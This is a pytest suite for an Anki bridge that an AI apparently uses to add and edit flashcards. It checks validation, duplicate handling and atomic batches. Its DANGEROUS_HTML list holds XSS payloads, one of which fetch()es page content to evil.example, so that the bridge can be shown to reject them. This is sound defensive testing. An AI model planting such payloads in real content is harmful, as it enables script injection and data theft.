"""Checks core.py against GOALS.md using a throwaway collection. Run: python -m pytest -q"""

import os
import tempfile

import pytest
from anki.collection import Collection

from core import Bridge, BridgeError


@pytest.fixture()
def bridge():
    d = tempfile.mkdtemp()
    path = os.path.join(d, "c.anki2")
    col = Collection(path)
    col.decks.add_normal_deck_with_name("Physics")
    col.close()
    return Bridge(path, sync=None)


def basic(deck="Physics", front="Why is the sky blue?", back="Rayleigh scattering", tags=None):
    return {
        "deck": deck,
        "note_type": "Basic",
        "fields": {"Front": front, "Back": back},
        "tags": tags or ["claude"],
    }


def test_lists(bridge):
    assert "Physics" in [d["name"] for d in bridge.list_decks()]
    nts = {n["name"]: n for n in bridge.list_note_types()}
    assert nts["Basic"]["fields"] == ["Front", "Back"]
    assert nts["Cloze"]["kind"] == "cloze"


def test_add_and_find(bridge):
    r = bridge.add_notes([basic()])
    assert len(r["added"]) == 1
    hit = bridge.find_notes("sky")["notes"]
    assert hit[0]["deck"] == "Physics" and hit[0]["tags"] == ["claude"]


def test_unknown_deck_note_type_and_field_rejected(bridge):
    for bad in (
        basic(deck="Nope"),
        {**basic(), "note_type": "Nope"},
        {**basic(), "fields": {"Front": "x", "Bak": "y"}},
    ):
        with pytest.raises(BridgeError):
            bridge.add_notes([bad])
    assert bridge.find_notes("deck:Physics")["notes"] == []


def test_batch_is_all_or_nothing(bridge):
    with pytest.raises(BridgeError):
        bridge.add_notes([basic(), basic(deck="Nope", front="other")])
    assert bridge.find_notes("deck:Physics")["notes"] == []


def test_duplicates_rejected_existing_and_in_batch(bridge):
    bridge.add_notes([basic()])
    with pytest.raises(BridgeError, match="duplicate"):
        bridge.add_notes([basic(back="different back")])
    with pytest.raises(BridgeError, match="duplicate"):
        bridge.add_notes([basic(front="q"), basic(front="q", back="z")])


def test_empty_first_field_and_bad_cloze_rejected(bridge):
    with pytest.raises(BridgeError):
        bridge.add_notes([basic(front="  ")])
    with pytest.raises(BridgeError, match="cloze"):
        bridge.add_notes(
            [{"deck": "Physics", "note_type": "Cloze", "fields": {"Text": "no deletion"}}]
        )
    bridge.add_notes(
        [{"deck": "Physics", "note_type": "Cloze", "fields": {"Text": "{{c1::Rayleigh}} scattering"}}]
    )


def test_update_partial_and_tags(bridge):
    nid = bridge.add_notes([basic()])["added"][0]
    r = bridge.update_note(nid, fields={"Back": "Rayleigh scattering of sunlight"}, add_tags=["to-review"])
    assert r["note"]["fields"]["Front"] == "Why is the sky blue?"
    assert r["note"]["fields"]["Back"].endswith("sunlight")
    assert set(r["note"]["tags"]) == {"claude", "to-review"}
    with pytest.raises(BridgeError):
        bridge.update_note(nid, fields={"Nope": "x"})
    with pytest.raises(BridgeError):
        bridge.update_note(999, fields={"Back": "x"})


def test_no_delete_or_restructure_surface():
    names = {m for m in dir(Bridge) if not m.startswith("_")}
    assert not {m for m in names if "delete" in m or "remove" in m or "create" in m}


def test_sync_not_configured_is_harmless(bridge):
    assert bridge.sync()["result"] == "sync not configured"


# ---- input shape: reject and report, never coerce or drop -----------------------------


def count_notes(bridge) -> int:
    return bridge.find_notes("")["total"]


@pytest.mark.parametrize("tags", ["claude", [1, 2], ["two words"]])
def test_tags_must_be_a_list_of_single_words(bridge, tags):
    with pytest.raises(BridgeError):
        bridge.add_notes([basic(tags=tags)])
    assert count_notes(bridge) == 0


@pytest.mark.parametrize("value", [None, ["x", "y"], {"a": "b"}])
def test_field_values_must_be_strings(bridge, value):
    with pytest.raises(BridgeError):
        bridge.add_notes([{**basic(), "fields": {"Front": "q", "Back": value}}])
    assert count_notes(bridge) == 0


def test_unknown_item_keys_are_rejected_not_dropped(bridge):
    item = {**basic(), "tag": ["physics"]}  # typo for "tags"
    with pytest.raises(BridgeError, match="tag"):
        bridge.add_notes([item])
    assert count_notes(bridge) == 0


@pytest.mark.parametrize(
    "item",
    [
        "Front: q, Back: a",
        {**basic(), "fields": "Front: q"},
        {**basic(), "deck": 1},
        {**basic(), "note_type": 5},
    ],
    ids=["item-is-a-string", "fields-is-a-string", "deck-is-a-number", "note-type-is-a-number"],
)
def test_malformed_items_are_a_readable_error(bridge, item):
    """Anything but BridgeError reaches Claude as a bare "Error executing tool add_notes"."""
    with pytest.raises(BridgeError):
        bridge.add_notes([item])
    assert count_notes(bridge) == 0


def test_update_rejects_non_string_values_and_bad_tags(bridge):
    nid = bridge.add_notes([basic()])["added"][0]
    for kwargs in ({"fields": {"Back": None}}, {"add_tags": "abc"}, {"add_tags": ["two words"]}):
        with pytest.raises(BridgeError):
            bridge.update_note(nid, **kwargs)
    note = bridge.find_notes(f"nid:{nid}")["notes"][0]
    assert note["fields"]["Back"] == "Rayleigh scattering" and note["tags"] == ["claude"]


def test_invalid_search_is_a_readable_error(bridge):
    with pytest.raises(BridgeError, match="quote"):
        bridge.find_notes('deck:"unclosed')


# ---- deck and note type names are data, not search syntax ------------------------------


def make_bridge(decks: list[str]) -> Bridge:
    path = os.path.join(tempfile.mkdtemp(), "c.anki2")
    col = Collection(path)
    for name in decks:
        col.decks.add_normal_deck_with_name(name)
    col.close()
    return Bridge(path, sync=None)


@pytest.mark.parametrize(
    "name, decoy",
    [("A_B", "AxB"), ("Star*", "Starlight"), ('Quo"te', None), ("Back\\slash", None), ("Paren(1)", None)],
)
def test_list_decks_counts_decks_with_search_characters_in_their_name(name, decoy):
    b = make_bridge([name] + ([decoy] if decoy else []))
    b.add_notes([basic(deck=name, front=f"{name} 1")])
    if decoy:
        b.add_notes([basic(deck=decoy, front=f"{decoy} {i}") for i in range(2)])
    counts = {d["name"]: d["notes"] for d in b.list_decks()}
    assert counts[name] == 1
    if decoy:
        assert counts[decoy] == 2


def test_list_decks_is_fast_on_a_large_collection():
    """One search per deck was ~900 ms here; one query over the cards table is ~10 ms."""
    import time

    from anki.collection import AddNoteRequest

    path = os.path.join(tempfile.mkdtemp(), "c.anki2")
    col = Collection(path)
    dids = [col.decks.id(f"Deck{i:03d}") for i in range(600)]
    nt = col.models.by_name("Basic")
    requests = []
    for i in range(20_000):
        note = col.new_note(nt)
        note["Front"], note["Back"] = f"q{i}", "a"
        requests.append(AddNoteRequest(note=note, deck_id=dids[i % len(dids)]))
    col.add_notes(requests)
    col.close()
    b = Bridge(path, sync=None)

    started = time.perf_counter()
    decks = b.list_decks()
    elapsed = time.perf_counter() - started
    assert sum(d["notes"] for d in decks) == 20_000
    assert elapsed < 0.3, f"list_decks took {elapsed:.2f}s"


def add_notetype(bridge: Bridge, name: str) -> None:
    col = Collection(bridge.path)
    nt = col.models.copy(col.models.by_name("Basic"), add=False)
    nt["name"] = name
    col.models.add_dict(nt)
    col.close()


def test_note_type_example_comes_from_that_note_type_only(bridge):
    add_notetype(bridge, "Basic*")  # '*' is a search wildcard
    bridge.add_notes([basic()])
    examples = {n["name"]: n["example"] for n in bridge.list_note_types(with_examples=True)}
    assert examples["Basic"] is not None
    assert examples["Basic*"] is None


def test_note_type_examples_survive_a_backslash_in_the_name(bridge):
    add_notetype(bridge, "Back\\slash type")
    names = [n["name"] for n in bridge.list_note_types(with_examples=True)]
    assert "Back\\slash type" in names


def test_adding_to_a_filtered_deck_is_rejected(bridge):
    """Anki silently puts such a card in Default; the caller asked for the filtered deck."""
    col = Collection(bridge.path)
    col.decks.new_filtered("Cram")
    col.close()
    with pytest.raises(BridgeError, match="Cram"):
        bridge.add_notes([basic(deck="Cram")])
    assert count_notes(bridge) == 0


# ---- the collection must exist ------------------------------------------------------------


@pytest.mark.parametrize("call", ["list_decks", "find_notes", "add_notes"])
def test_missing_collection_is_an_error_not_created(call):
    """A never-downloaded collection is empty, so reads would say "no duplicates"."""
    path = os.path.join(tempfile.mkdtemp(), "owner", "collection.anki2")
    os.makedirs(os.path.dirname(path))
    b = Bridge(path, sync=None)
    with pytest.raises(BridgeError, match="bootstrap"):
        if call == "list_decks":
            b.list_decks()
        elif call == "find_notes":
            b.find_notes("")
        else:
            b.add_notes([basic(deck="Default")])
    assert not os.path.exists(path)


# ---- card HTML: no scripts, no remote resources -----------------------------------------------


DANGEROUS_HTML = [
    "<script>alert(1)</script>",
    '<img src=x onerror="fetch(\'https://evil.example/?\'+document.body.innerHTML)">',
    "<IMG SRC=x OnError=alert(1)>",
    '<svg onload="alert(1)"></svg>',
    '<iframe src="https://evil.example"></iframe>',
    '<object data="https://evil.example/x.swf"></object>',
    '<a href="javascript:alert(1)">tap</a>',
    '<img src="https://evil.example/pixel.png">',
    '<img src="//evil.example/pixel.png">',
    '<link rel="stylesheet" href="https://evil.example/x.css">',
    "<style>@import url(https://evil.example/x.css);</style>",
]


@pytest.mark.parametrize("html", DANGEROUS_HTML)
def test_add_rejects_scripts_and_remote_resources(bridge, html):
    with pytest.raises(BridgeError):
        bridge.add_notes([basic(back=f"Rayleigh {html}")])
    assert count_notes(bridge) == 0


@pytest.mark.parametrize("html", DANGEROUS_HTML)
def test_update_rejects_scripts_and_remote_resources(bridge, html):
    nid = bridge.add_notes([basic()])["added"][0]
    with pytest.raises(BridgeError):
        bridge.update_note(nid, fields={"Back": html})
    assert bridge.find_notes(f"nid:{nid}")["notes"][0]["fields"]["Back"] == "Rayleigh scattering"


def test_ordinary_card_formatting_is_still_accepted(bridge):
    """Guards the HTML check against being too strict."""
    backs = [
        "<b>bold</b>, <i>italic</i>, <u>u</u><br>next line",
        "<ul><li>one</li><li>two</li></ul>",
        "H<sub>2</sub>O and x<sup>2</sup>, <code>len(x)</code>",
        r"MathJax \(e^{i\pi} + 1 = 0\)",
        '<img src="diagram.png">',  # local media file, not a remote URL
        "a &lt; b &amp;&amp; c",
    ]
    bridge.add_notes([basic(front=f"q{i}", back=b) for i, b in enumerate(backs)])
    assert count_notes(bridge) == len(backs)


# ---- update_note keeps the note valid ------------------------------------------------------


def test_update_cannot_empty_the_first_field(bridge):
    nid = bridge.add_notes([basic()])["added"][0]
    with pytest.raises(BridgeError):
        bridge.update_note(nid, fields={"Front": "  "})
    assert bridge.find_notes(f"nid:{nid}")["notes"][0]["fields"]["Front"] == "Why is the sky blue?"


def test_update_cannot_make_a_duplicate(bridge):
    bridge.add_notes([basic(front="first")])
    nid = bridge.add_notes([basic(front="second")])["added"][0]
    with pytest.raises(BridgeError, match="duplicate"):
        bridge.update_note(nid, fields={"Front": "first"})
    assert bridge.find_notes(f"nid:{nid}")["notes"][0]["fields"]["Front"] == "second"


def test_update_cannot_remove_every_cloze_deletion(bridge):
    nid = bridge.add_notes(
        [{"deck": "Physics", "note_type": "Cloze", "fields": {"Text": "{{c1::Rayleigh}} scattering"}}]
    )["added"][0]
    with pytest.raises(BridgeError, match="cloze"):
        bridge.update_note(nid, fields={"Text": "Rayleigh scattering"})
    assert "{{c1::" in bridge.find_notes(f"nid:{nid}")["notes"][0]["fields"]["Text"]


# ---- a batch is one write ---------------------------------------------------------------------


def test_a_failure_partway_through_a_batch_writes_nothing(bridge):
    """Fault injection through Anki's own hook, which runs before every note is stored."""
    from anki import hooks

    def fail_on_boom(col, note, deck_id):
        if note["Front"] == "boom":
            raise RuntimeError("disk full")

    hooks.note_will_be_added.append(fail_on_boom)
    try:
        with pytest.raises(Exception):
            bridge.add_notes([basic(front="fine"), basic(front="boom"), basic(front="also fine")])
    finally:
        hooks.note_will_be_added.remove(fail_on_boom)
    assert count_notes(bridge) == 0
